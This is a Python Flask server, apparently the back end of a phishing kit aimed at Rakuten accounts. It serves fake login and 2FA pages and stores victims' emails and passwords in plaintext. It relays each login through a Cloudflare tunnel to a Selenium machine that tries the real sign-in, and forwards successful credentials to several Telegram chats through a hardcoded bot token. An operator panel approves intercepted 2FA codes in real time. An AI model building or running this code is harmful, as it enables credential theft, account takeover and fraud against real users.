from flask import Flask, render_template, request, jsonify, session
from flask_socketio import SocketIO, emit, join_room, leave_room
import json
import os
import time
import threading
import requests
import urllib3
import uuid
from datetime import datetime, timedelta, timezone

# SSL警告を無効化
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Flask初期化
app = Flask(__name__, template_folder='templates')
app.secret_key = os.getenv('SECRET_KEY', 'your-secret-key-here-change-in-production')

# SocketIO初期化 (gunicornと互換性のあるthreadingモードを使用)
socketio = SocketIO(
    app, 
    cors_allowed_origins="*", 
    async_mode='eventlet',
    ping_timeout=60,
    ping_interval=25,
    engineio_logger=True,
    logger=True
)

# データベースファイルパス
DB_PATH = os.getenv('DB_PATH', 'data/alldatabase.json')

# テレグラム設定
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8314466263:AAG_eAJkU6j8SNFfJsodij9hkkdpSPARc6o')
TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '8204394801,8303180774,8243562591').split(',')

# 🔥 PC側のCloudflare URL(環境変数から取得、なければデフォルト値)
CLOUDFLARE_URL = os.getenv('CLOUDFLARE_URL', 'https://config-surname-carroll-incoming.trycloudflare.com').rstrip('/')

# CloudflareのIPアドレス(DNS解決できない場合の代替)
CLOUDFLARE_IPS = ['104.16.231.132', '104.16.230.132']
CLOUDFLARE_HOSTNAME = CLOUDFLARE_URL.replace('https://', '').replace('http://', '')

# 日本時間のタイムゾーン
JST = timezone(timedelta(hours=9))

def get_jst_now():
    """日本時間の現在時刻を取得"""
    return datetime.now(JST)

def get_jst_now_str():
    """日本時間の現在時刻を文字列で取得"""
    return get_jst_now().strftime('%Y-%m-%dT%H:%M:%S')

def get_cloudflare_url_with_ip():
    """IPアドレスを使ったCloudflare URL"""
    return f"https://{CLOUDFLARE_IPS[0]}"

def get_cloudflare_headers():
    """CloudflareへのリクエストヘッダーにHostを追加"""
    return {'Host': CLOUDFLARE_HOSTNAME}

# PC接続状態を管理
pc_connection_status = {
    'connected': False,
    'last_check': None,
    'last_success': None,
    'url': CLOUDFLARE_URL,
    'error': None
}

# セッションタイムアウト管理
session_timeouts = {}

# Telegram通知の重複防止
telegram_error_sent = {}

def log_with_timestamp(level, message):
    """タイムスタンプ付きログ出力"""
    timestamp = get_jst_now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    print(f"[{timestamp}] [SERVER] [{level}] {message}")

# ========================================
# PC接続チェック機能
# ========================================

def check_pc_connection_internal():
    """PC側との接続を内部的にチェック"""
    try:
        log_with_timestamp("INFO", f"PC接続チェック開始 → {CLOUDFLARE_URL}/receive_check")
        
        # CloudflareのIPアドレスを直接使用
        cloudflare_ip = "104.16.231.132"
        url_with_ip = f"http://{cloudflare_ip}/receive_check"  # HTTPに変更
        hostname = CLOUDFLARE_URL.replace("https://", "").replace("http://", "")
        
        response = requests.get(
            url_with_ip,
            headers={"Host": hostname},
            timeout=30
        )
        
        pc_connection_status['last_check'] = get_jst_now_str()
        
        if response.status_code == 200 and response.text.strip() == "yes!":
            pc_connection_status['connected'] = True
            pc_connection_status['last_success'] = get_jst_now_str()
            pc_connection_status['error'] = None
            log_with_timestamp("SUCCESS", "✓ PC接続チェック成功")
            return True
        else:
            pc_connection_status['connected'] = False
            error_msg = f"予期しないレスポンス (Status: {response.status_code}, Text: {response.text})"
            pc_connection_status['error'] = error_msg
            log_with_timestamp("ERROR", f"✗ PC応答異常 | {error_msg}")
            return False
    
    except requests.exceptions.Timeout:
        pc_connection_status['connected'] = False
        pc_connection_status['last_check'] = get_jst_now_str()
        pc_connection_status['error'] = "接続タイムアウト"
        log_with_timestamp("ERROR", "✗ PC接続タイムアウト")
        return False
    
    except requests.exceptions.ConnectionError as e:
        pc_connection_status['connected'] = False
        pc_connection_status['last_check'] = get_jst_now_str()
        pc_connection_status['error'] = f"接続エラー: {str(e)}"
        log_with_timestamp("ERROR", f"✗ PC接続エラー: {str(e)}")
        return False
    
    except Exception as e:
        pc_connection_status['connected'] = False
        pc_connection_status['last_check'] = get_jst_now_str()
        pc_connection_status['error'] = f"不明なエラー: {str(e)}"
        log_with_timestamp("ERROR", f"✗ PC接続エラー: {str(e)}")
        return False

# ========================================
# データベース操作関数
# ========================================

def load_database():
    """データベースをロード"""
    if not os.path.exists(DB_PATH):
        return {"accounts": []}
    
    try:
        with open(DB_PATH, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {"accounts": []}

def save_database(data):
    """データベースを保存"""
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    with open(DB_PATH, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def find_account(email, password):
    """アカウントを検索"""
    db = load_database()
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            return account
    return None

def create_or_update_account(email, password, status):
    """アカウントを作成または更新"""
    db = load_database()
    account = find_account(email, password)
    
    now = get_jst_now_str()
    
    if account:
        account['login_history'].append({
            'datetime': now,
            'status': status
        })
        log_with_timestamp("DB", f"アカウント更新: {status} | Email: {email}")
    else:
        new_account = {
            'email': email,
            'password': password,
            'login_history': [{
                'datetime': now,
                'status': status
            }],
            'twofa_session': None
        }
        db['accounts'].append(new_account)
        log_with_timestamp("DB", f"新規アカウント作成: {status} | Email: {email}")
    
    save_database(db)
    return db

def init_twofa_session(email, password):
    """2FAセッションを初期化"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            account['twofa_session'] = {
                'active': True,
                'codes': [],
                'security_check_completed': False,
                'created_at': get_jst_now_str()
            }
            save_database(db)
            log_with_timestamp("DB", f"2FAセッション初期化 | Email: {email}")
            return True
    
    return False

def add_twofa_code(email, password, code):
    """2FAコードを追加"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                now = get_jst_now_str()
                account['twofa_session']['codes'].append({
                    'code': code,
                    'datetime': now,
                    'status': 'pending'
                })
                save_database(db)
                log_with_timestamp("DB", f"2FAコード追加: {code} | Email: {email}")
                return True
    return False

def update_twofa_status(email, password, code, status):
    """2FAコードのステータスを更新"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                for code_entry in account['twofa_session']['codes']:
                    if code_entry['code'] == code:
                        code_entry['status'] = status
                        save_database(db)
                        log_with_timestamp("DB", f"2FAステータス更新: {code} -> {status} | Email: {email}")
                        return True
    return False

def complete_security_check(email, password):
    """セキュリティチェック完了"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            if account.get('twofa_session'):
                account['twofa_session']['security_check_completed'] = True
                save_database(db)
                log_with_timestamp("DB", f"セキュリティチェック完了 | Email: {email}")
                return True
    return False

def delete_twofa_session(email, password):
    """2FAセッションを削除"""
    db = load_database()
    
    for account in db['accounts']:
        if account['email'] == email and account['password'] == password:
            account['twofa_session'] = None
            save_database(db)
            log_with_timestamp("DB", f"2FAセッション削除 | Email: {email}")
            return True
    return False

def get_all_active_sessions():
    """すべてのアクティブな2FAセッションを取得"""
    db = load_database()
    active_sessions = []
    
    for account in db['accounts']:
        if account.get('twofa_session') and account['twofa_session'].get('active'):
            active_sessions.append({
                'email': account['email'],
                'password': account['password'],
                'session': account['twofa_session']
            })
    
    return active_sessions

# ========================================
# テレグラム通知関数
# ========================================

def send_telegram_notification(email, password):
    """テレグラムにログイン成功通知を送信(DNS解決不要・IP直接指定版)"""
    message = f"◎ログイン成功\nメールアドレス:{email}\nパスワード:{password}"
    
    log_with_timestamp("TELEGRAM", f"通知送信開始 | Email: {email}")
    
    import urllib.request
    import json as json_module
    import ssl
    
    # SSL証明書検証を無効化するコンテキスト
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    
    # Telegram APIのIPアドレスを直接使用(DNS解決不要)
    telegram_ips = [
        "149.154.167.220",
        "149.154.167.197",
        "149.154.167.198"
    ]
    
    for chat_id in TELEGRAM_CHAT_IDS:
        success = False
        max_retries = 3
        
        for attempt in range(max_retries):
            for ip in telegram_ips:
                try:
                    # IPアドレスを直接使用してURL構築
                    url = f"https://{ip}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                    data = {'chat_id': chat_id, 'text': message}
                    
                    log_with_timestamp("TELEGRAM", f"送信試行 {attempt + 1}/{max_retries} | Chat: {chat_id} | IP: {ip}")
                    
                    req = urllib.request.Request(
                        url,
                        data=json_module.dumps(data).encode('utf-8'),
                        headers={
                            'Content-Type': 'application/json',
                            'Host': 'api.telegram.org'  # Hostヘッダーを追加
                        },
                        method='POST'
                    )
                    
                    with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                        if response.status == 200:
                            log_with_timestamp("TELEGRAM", f"✓ 送信完了: Chat {chat_id} via IP {ip}")
                            success = True
                            break
                        else:
                            log_with_timestamp("ERROR", f"Telegram API エラー | Chat: {chat_id} | Status: {response.status} | IP: {ip}")
                        
                except urllib.error.URLError as e:
                    log_with_timestamp("ERROR", f"Telegram URLエラー | Chat: {chat_id} | IP: {ip} | Error: {str(e)}")
                    
                except Exception as e:
                    log_with_timestamp("ERROR", f"Telegram 予期しないエラー | Chat: {chat_id} | IP: {ip} | Error: {str(e)}")
            
            if success:
                break
                
            if attempt < max_retries - 1:
                time.sleep(2)
        
        if not success:
            log_with_timestamp("ERROR", f"✗ Telegram通知失敗(全試行失敗) | Chat: {chat_id}")


def send_telegram_notification_error(message):
    """エラー通知をテレグラムに送信(重複防止あり・IP直接指定版)"""
    error_type = message.split('\n')[0] if '\n' in message else message
    current_time = time.time()
    
    if error_type in telegram_error_sent:
        last_sent = telegram_error_sent[error_type]
        if current_time - last_sent < 300:
            log_with_timestamp("TELEGRAM", f"重複通知スキップ(5分以内に送信済み)| Error: {error_type}")
            return
    
    timestamp = get_jst_now().strftime('%Y-%m-%d %H:%M:%S')
    error_message = f"⚠️ エラー通知\n{message}\nタイムスタンプ: {timestamp}"
    
    log_with_timestamp("TELEGRAM", f"エラー通知送信開始 | Message: {error_type}")
    
    import urllib.request
    import json as json_module
    import ssl
    
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    
    telegram_ips = [
        "149.154.167.220",
        "149.154.167.197",
        "149.154.167.198"
    ]
    
    for chat_id in TELEGRAM_CHAT_IDS:
        for ip in telegram_ips:
            try:
                url = f"https://{ip}/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                data = {'chat_id': chat_id, 'text': error_message}
                
                req = urllib.request.Request(
                    url,
                    data=json_module.dumps(data).encode('utf-8'),
                    headers={
                        'Content-Type': 'application/json',
                        'Host': 'api.telegram.org'
                    },
                    method='POST'
                )
                
                with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                    if response.status == 200:
                        log_with_timestamp("TELEGRAM", f"エラー通知送信完了: Chat {chat_id} via IP {ip}")
                        break
            except Exception as e:
                log_with_timestamp("ERROR", f"Telegramエラー通知失敗 (Chat: {chat_id}, IP: {ip}) | Error: {str(e)}")
    
    telegram_error_sent[error_type] = current_time

# ========================================
# タイムアウト管理
# ========================================

def start_session_timeout(email, password, timeout_seconds=600):
    """セッションタイムアウトを開始"""
    def timeout_handler():
        time.sleep(timeout_seconds)
        log_with_timestamp("TIMEOUT", f"セッションタイムアウト発生 | Email: {email}")
        
        socketio.emit('session_timeout', {
            'email': email,
            'message': '一時的なエラーが発生しました。もう一度お試しください'
        }, namespace='/', to=f'user_{email}')
        
        delete_twofa_session(email, password)
        
        if email in session_timeouts:
            del session_timeouts[email]
    
    if email in session_timeouts:
        session_timeouts[email].cancel()
    
    timer = threading.Timer(timeout_seconds, timeout_handler)
    timer.start()
    session_timeouts[email] = timer
    log_with_timestamp("TIMEOUT", f"タイマー開始: {timeout_seconds}秒 | Email: {email}")

def cancel_session_timeout(email):
    """セッションタイムアウトをキャンセル"""
    if email in session_timeouts:
        session_timeouts[email].cancel()
        del session_timeouts[email]
        log_with_timestamp("TIMEOUT", f"タイマーキャンセル完了 | Email: {email}")

# ========================================
# WebSocket イベント
# ========================================

@socketio.on('connect')
def handle_connect():
    log_with_timestamp("WEBSOCKET", f"クライアント接続 | Session: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    log_with_timestamp("WEBSOCKET", f"クライアント切断 | Session: {request.sid}")

@socketio.on('join_user_room')
def handle_join_user_room(data):
    email = data.get('email')
    if email:
        join_room(f'user_{email}')
        log_with_timestamp("WEBSOCKET", f"ユーザーが部屋に参加 | Email: {email} | Room: user_{email} | SID: {request.sid}")

@socketio.on('join_admin_room')
def handle_join_admin_room():
    join_room('admin')
    log_with_timestamp("WEBSOCKET", f"管理者が部屋に参加 | SID: {request.sid}")

# ========================================
# ルート定義
# ========================================

@app.route('/')
def index():
    return render_template('loginemail.html')

@app.route('/login/email')
def login_email():
    return render_template('loginemail.html')

@app.route('/login/password')
def login_password():
    return render_template('loginpassword.html')

@app.route('/login/2fa')
def login_2fa():
    return render_template('login2fa.html')

@app.route('/dashboard/security-check')
def dashboard_security_check():
    return render_template('dashboardsecuritycheck.html')

@app.route('/dashboard/complete')
def dashboard_complete():
    return render_template('dashboardcomplete.html')

@app.route('/admin/top')
def admin_top():
    return render_template('admintop.html')

@app.route('/admin/accounts')
def admin_accounts():
    return render_template('adminaccounts.html')

@app.route('/check')
def check():
    return render_template('check.html')

# ========================================
# PC接続チェックAPI
# ========================================

@app.route('/api/check', methods=['POST'])
def api_check():
    """
    PC接続チェックAPI
    /check ページから呼び出され、PC側との接続を確認する
    """
    try:
        log_with_timestamp("INFO", "=" * 60)
        log_with_timestamp("INFO", "PC接続チェック開始")
        log_with_timestamp("INFO", f"接続先URL: {CLOUDFLARE_URL}")
        log_with_timestamp("INFO", "=" * 60)
        
        # CloudflareのIPアドレスを直接使用
        cloudflare_ip = "104.16.231.132"
        url_with_ip = f"http://{cloudflare_ip}/receive_check"
        hostname = CLOUDFLARE_URL.replace("https://", "").replace("http://", "")
        
        # PC側の /receive_check エンドポイントに接続
        response = requests.get(
            url_with_ip,
            headers={"Host": hostname},
            timeout=30,
            
        )
        
        # 接続状態を更新
        pc_connection_status['last_check'] = get_jst_now_str()
        
        if response.status_code == 200 and response.text.strip() == "yes!":
            # 接続成功
            pc_connection_status['connected'] = True
            pc_connection_status['last_success'] = get_jst_now_str()
            pc_connection_status['error'] = None
            
            log_with_timestamp("SUCCESS", "✓✓✓ PC接続チェック成功! ✓✓✓")
            log_with_timestamp("INFO", f"レスポンス: {response.text}")
            log_with_timestamp("INFO", "=" * 60)
            
            return jsonify({
                "status": "success",
                "message": "PC側との接続が確認できました",
                "pc_response": response.text,
                "timestamp": pc_connection_status['last_success']
            }), 200
        else:
            # 予期しないレスポンス
            pc_connection_status['connected'] = False
            error_msg = f"予期しないレスポンス (Status: {response.status_code}, Text: {response.text})"
            pc_connection_status['error'] = error_msg
            
            log_with_timestamp("ERROR", "✗✗✗ PC応答異常 ✗✗✗")
            log_with_timestamp("ERROR", f"Status Code: {response.status_code}")
            log_with_timestamp("ERROR", f"Response Text: {response.text}")
            log_with_timestamp("INFO", "=" * 60)
            
            return jsonify({
                "status": "error",
                "message": "PC側から予期しないレスポンスが返されました",
                "details": error_msg
            }), 500
    
    except requests.exceptions.Timeout:
        pc_connection_status['connected'] = False
        pc_connection_status['last_check'] = get_jst_now_str()
        pc_connection_status['error'] = "接続タイムアウト (10秒)"
        
        log_with_timestamp("ERROR", "✗✗✗ PC接続タイムアウト ✗✗✗")
        log_with_timestamp("ERROR", "10秒以内に応答がありませんでした")
        log_with_timestamp("INFO", "考えられる原因:")
        log_with_timestamp("INFO", "1. PC側のapp.pyが起動していない")
        log_with_timestamp("INFO", "2. Cloudflareトンネルが起動していない")
        log_with_timestamp("INFO", "3. ネットワークの問題")
        log_with_timestamp("INFO", "=" * 60)
        
        return jsonify({
            "status": "error",
            "message": "PC側への接続がタイムアウトしました",
            "details": "10秒以内に応答がありませんでした"
        }), 500
    
    except requests.exceptions.ConnectionError as e:
        pc_connection_status['connected'] = False
        pc_connection_status['last_check'] = get_jst_now_str()
        pc_connection_status['error'] = f"接続エラー: {str(e)}"
        
        log_with_timestamp("ERROR", "✗✗✗ PC接続エラー ✗✗✗")
        log_with_timestamp("ERROR", f"詳細: {str(e)}")
        log_with_timestamp("INFO", "考えられる原因:")
        log_with_timestamp("INFO", "1. CloudflareのURLが間違っている")
        log_with_timestamp("INFO", f"2. 現在のURL: {CLOUDFLARE_URL}")
        log_with_timestamp("INFO", "3. Cloudflareトンネルが再起動され、URLが変わった可能性")
        log_with_timestamp("INFO", "=" * 60)
        
        return jsonify({
            "status": "error",
            "message": "PC側への接続に失敗しました",
            "details": str(e),
            "current_url": CLOUDFLARE_URL
        }), 500
    
    except Exception as e:
        pc_connection_status['connected'] = False
        pc_connection_status['last_check'] = get_jst_now_str()
        pc_connection_status['error'] = f"不明なエラー: {str(e)}"
        
        log_with_timestamp("ERROR", "✗✗✗ 不明なエラー ✗✗✗")
        log_with_timestamp("ERROR", f"詳細: {str(e)}")
        log_with_timestamp("INFO", "=" * 60)
        
        return jsonify({
            "status": "error",
            "message": "予期しないエラーが発生しました",
            "details": str(e)
        }), 500

@app.route('/api/pc-status', methods=['GET'])
def api_pc_status():
    """PC接続状態を取得"""
    return jsonify({
        'success': True,
        'status': pc_connection_status
    })

# ========================================
# API エンドポイント
# ========================================

@app.route('/api/login', methods=['POST'])
def api_login():
    """ログイン処理"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    log_with_timestamp("API", f"ログインリクエスト受信 | Email: {email}")
    
    if not email or not password:
        log_with_timestamp("API", "バリデーションエラー: 空のemail/password")
        return jsonify({
            'success': False,
            'message': 'メールアドレスとパスワードを入力してください'
        })
    
    # PC接続チェックを事前に実行
    if not check_pc_connection_internal():
        log_with_timestamp("ERROR", "PC側との接続が確認できません")
        return jsonify({
            'success': False,
            'message': '一時的なエラーが発生しました。もう一度お試しください',
            'details': 'PC connection failed'
        })
    
    try:
        # PC側にログイン情報を送信
        log_with_timestamp("INFO", f"PC側にログイン依頼送信 → {CLOUDFLARE_URL}/execute_login")
        
        # CloudflareのIPアドレスを直接使用
        cloudflare_ip = "104.16.231.132"
        url_with_ip = f"http://{cloudflare_ip}/execute_login"
        hostname = CLOUDFLARE_URL.replace("https://", "").replace("http://", "")
        
        response = requests.post(
            url_with_ip,
            headers={"Host": hostname},
            json={
                'email': email,
                'password': password
            },
            timeout=120,  # タイムアウトを120秒に延長
            
        )
        
        result = response.text.strip()
        log_with_timestamp("INFO", f"PC側からの応答: {result} | Status: {response.status_code}")
        
        if response.status_code == 200:
            if result == "success":
                # ログイン成功
                log_with_timestamp("SUCCESS", f"ログイン成功 | Email: {email}")
                
                create_or_update_account(email, password, 'success')
                init_twofa_session(email, password)
                
                # Telegram通知を別スレッドで実行(レスポンスをブロックしない)
                threading.Thread(
                    target=send_telegram_notification,
                    args=(email, password),
                    daemon=True
                ).start()
                
                socketio.emit('block_created', {
                    'email': email,
                    'password': password,
                    'timestamp': get_jst_now_str()
                }, namespace='/')
                log_with_timestamp("WEBSOCKET", f"管理者通知: block_created | Email: {email}")
                
                start_session_timeout(email, password)
                
                return jsonify({
                    'success': True,
                    'message': 'ログイン成功',
                    'requires_2fa': True
                })
            
            elif result == "failure":
                # ログイン失敗
                log_with_timestamp("FAILED", f"ログイン失敗 | Email: {email}")
                create_or_update_account(email, password, 'failed')
                
                return jsonify({
                    'success': False,
                    'message': 'ユーザーID、メールアドレス又はパスワードが間違っています'
                })
            
            else:
                log_with_timestamp("ERROR", f"不明な応答: {result}")
                return jsonify({
                    'success': False,
                    'message': '一時的なエラーが発生しました。もう一度お試しください'
                })
        else:
            log_with_timestamp("ERROR", f"PC側エラー | Status: {response.status_code}")
            return jsonify({
                'success': False,
                'message': '一時的なエラーが発生しました。もう一度お試しください'
            })
    
    except requests.exceptions.Timeout:
        log_with_timestamp("ERROR", f"PC側タイムアウト | Email: {email}")
        send_telegram_notification_error("Selenium PCがタイムアウトしました")
        return jsonify({
            'success': False,
            'message': '一時的なエラーが発生しました。もう一度お試しください'
        })
    
    except Exception as e:
        log_with_timestamp("ERROR", f"ログイン処理エラー | Email: {email} | Error: {str(e)}")
        send_telegram_notification_error(f"ログインエラー: {str(e)}")
        return jsonify({
            'success': False,
            'message': '一時的なエラーが発生しました。もう一度お試しください'
        })

@app.route('/api/2fa/submit', methods=['POST'])
def api_2fa_submit():
    """2FAコード送信"""
    data = request.json
    email = data.get('email', '').strip()
    code = data.get('code', '').strip()
    
    log_with_timestamp("API", f"2FAコード受信 | Email: {email} | Code: {code}")
    
    db = load_database()
    account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc.get('twofa_session') is not None and acc.get('twofa_session', {}).get('active'):
            account = acc
            break
    
    if not account:
        log_with_timestamp("ERROR", f"2FAセッション未発見 | Email: {email}")
        return jsonify({
            'success': False,
            'message': 'セッションが見つかりません'
        })
    
    password = account['password']
    
    if account['twofa_session']['codes']:
        has_pending = any(c['status'] == 'pending' for c in account['twofa_session']['codes'])
        if has_pending:
            log_with_timestamp("WARN", f"前のコード承認待ち | Email: {email}")
            return jsonify({
                'success': False,
                'message': '前のコードの承認待ちです'
            })
    
    add_twofa_code(email, password, code)
    start_session_timeout(email, password)
    
    db = load_database()
    updated_account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc['password'] == password:
            updated_account = acc
            break
    
    if updated_account and updated_account.get('twofa_session'):
        socketio.emit('twofa_code_submitted', {
            'email': email,
            'password': password,
            'code': code,
            'timestamp': get_jst_now_str(),
            'session': updated_account['twofa_session']
        }, namespace='/', to='admin')
        
        log_with_timestamp("WEBSOCKET", f"管理者通知送信完了: 2FAコード受信 | Email: {email}")
    
    return jsonify({
        'success': True,
        'message': '2FAコードを送信しました'
    })

@app.route('/api/2fa/check-status', methods=['POST'])
def api_2fa_check_status():
    """2FA承認状態をチェック"""
    data = request.json
    email = data.get('email', '').strip()
    
    db = load_database()
    account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc.get('twofa_session'):
            account = acc
            break
    
    if not account or not account.get('twofa_session'):
        return jsonify({
            'success': False,
            'is_approved': False
        })
    
    if account['twofa_session']['codes']:
        latest_code = account['twofa_session']['codes'][-1]
        if latest_code['status'] == 'approved':
            return jsonify({
                'success': True,
                'is_approved': True
            })
        elif latest_code['status'] == 'rejected':
            return jsonify({
                'success': True,
                'is_approved': False,
                'rejected': True
            })
    
    return jsonify({
        'success': True,
        'is_approved': False
    })

@app.route('/api/security-check/submit', methods=['POST'])
def api_security_check_submit():
    """セキュリティチェック送信"""
    data = request.json
    email = data.get('email', '').strip()
    
    log_with_timestamp("API", f"セキュリティチェック送信 | Email: {email}")
    
    db = load_database()
    account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc.get('twofa_session'):
            account = acc
            break
    
    socketio.emit('security_check_submitted', {
        'email': email,
        'password': account['password'] if account else '',
        'timestamp': get_jst_now_str(),
        'session': account['twofa_session'] if account else None
    }, namespace='/', to='admin')
    log_with_timestamp("WEBSOCKET", f"管理者通知: セキュリティチェック送信 | Email: {email}")
    
    return jsonify({
        'success': True,
        'message': 'セキュリティチェックを送信しました'
    })

@app.route('/api/security-check/check-status', methods=['POST'])
def api_security_check_status():
    """セキュリティチェック完了状態をチェック"""
    data = request.json
    email = data.get('email', '').strip()
    
    db = load_database()
    account = None
    for acc in db['accounts']:
        if acc['email'] == email and acc.get('twofa_session'):
            account = acc
            break
    
    if not account or not account.get('twofa_session'):
        return jsonify({
            'success': False,
            'completed': False
        })
    
    completed = account['twofa_session'].get('security_check_completed', False)
    
    return jsonify({
        'success': True,
        'completed': completed
    })

@app.route('/api/admin/accounts', methods=['GET'])
def api_admin_accounts():
    """アカウント一覧取得"""
    db = load_database()
    
    success_accounts = []
    failed_accounts = []
    
    for account in db['accounts']:
        if not account['login_history']:
            continue
        
        latest_login = max(account['login_history'], key=lambda x: x['datetime'])
        
        account_info = {
            'email': account['email'],
            'password': account['password'],
            'latest_login': latest_login['datetime'],
            'login_history': account['login_history']
        }
        
        if latest_login['status'] == 'success':
            success_accounts.append(account_info)
        else:
            failed_accounts.append(account_info)
    
    success_accounts.sort(key=lambda x: x['latest_login'], reverse=True)
    failed_accounts.sort(key=lambda x: x['latest_login'], reverse=True)
    
    return jsonify({
        'success': True,
        'success_accounts': success_accounts,
        'failed_accounts': failed_accounts
    })

@app.route('/api/admin/active-sessions', methods=['GET'])
def api_admin_active_sessions():
    """アクティブな2FAセッション取得"""
    sessions = get_all_active_sessions()
    return jsonify({
        'success': True,
        'sessions': sessions
    })

@app.route('/api/admin/2fa/approve', methods=['POST'])
def api_admin_2fa_approve():
    """2FAコードを承認"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    code = data.get('code', '').strip()
    
    log_with_timestamp("API", f"管理者承認受信 | Code: {code} | Email: {email}")
    
    update_twofa_status(email, password, code, 'approved')
    
    socketio.emit('twofa_approved', {
        'email': email
    }, namespace='/', to=f'user_{email}')
    log_with_timestamp("WEBSOCKET", f"ユーザー通知: 2FA承認 | Email: {email} | Room: user_{email}")
    
    return jsonify({
        'success': True,
        'message': '2FAコードを承認しました'
    })

@app.route('/api/admin/2fa/reject', methods=['POST'])
def api_admin_2fa_reject():
    """2FAコードを再入力要求"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    code = data.get('code', '').strip()
    
    log_with_timestamp("API", f"管理者拒否受信 | Code: {code} | Email: {email}")
    
    update_twofa_status(email, password, code, 'rejected')
    
    socketio.emit('twofa_rejected', {
        'email': email
    }, namespace='/', to=f'user_{email}')
    log_with_timestamp("WEBSOCKET", f"ユーザー通知: 2FA拒否 | Email: {email} | Room: user_{email}")
    
    return jsonify({
        'success': True,
        'message': '再入力を要求しました'
    })

@app.route('/api/admin/security-complete', methods=['POST'])
def api_admin_security_complete():
    """セキュリティチェック完了"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    log_with_timestamp("API", f"セキュリティチェック完了 | Email: {email}")
    
    complete_security_check(email, password)
    cancel_session_timeout(email)
    
    socketio.emit('security_check_completed', {
        'email': email
    }, namespace='/', to=f'user_{email}')
    log_with_timestamp("WEBSOCKET", f"ユーザー通知: セキュリティチェック完了 | Email: {email} | Room: user_{email}")
    
    return jsonify({
        'success': True,
        'message': 'セキュリティチェックを完了しました'
    })

@app.route('/api/admin/block/delete', methods=['POST'])
def api_admin_block_delete():
    """ブロック削除"""
    data = request.json
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    log_with_timestamp("API", f"ブロック削除 | Email: {email}")
    
    delete_twofa_session(email, password)
    cancel_session_timeout(email)
    
    return jsonify({
        'success': True,
        'message': 'ブロックを削除しました'
    })

@app.get("/healthz")
def healthz():
    return "ok", 200

if __name__ == '__main__':
    print("=" * 70)
    print("楽天ログイン管理システム起動(サーバー側)")
    print(f"Cloudflare URL: {CLOUDFLARE_URL}")
    print("=" * 70)
    log_with_timestamp("INFO", "システム起動開始")
    
    # 起動時にPC接続チェック
    log_with_timestamp("INFO", "起動時PC接続チェック実行中...")
    if check_pc_connection_internal():
        log_with_timestamp("SUCCESS", "✓ PC側との接続確認完了!")
    else:
        log_with_timestamp("WARN", "⚠ PC側との接続に失敗しました")
        log_with_timestamp("WARN", "以下を確認してください:")
        log_with_timestamp("WARN", "1. PC側のapp.pyが起動しているか")
        log_with_timestamp("WARN", "2. Cloudflareトンネルが起動しているか")
        log_with_timestamp("WARN", f"3. 環境変数CLOUDFLARE_URLが正しいか: {CLOUDFLARE_URL}")
    
    debug_mode = os.getenv('DEBUG', 'True').lower() == 'true'
    port = int(os.getenv('PORT', 5000))
    
    socketio.run(
        app,
        debug=debug_mode,
        host='0.0.0.0',
        port=port,
        allow_unsafe_werkzeug=True,
        log_output=False
    )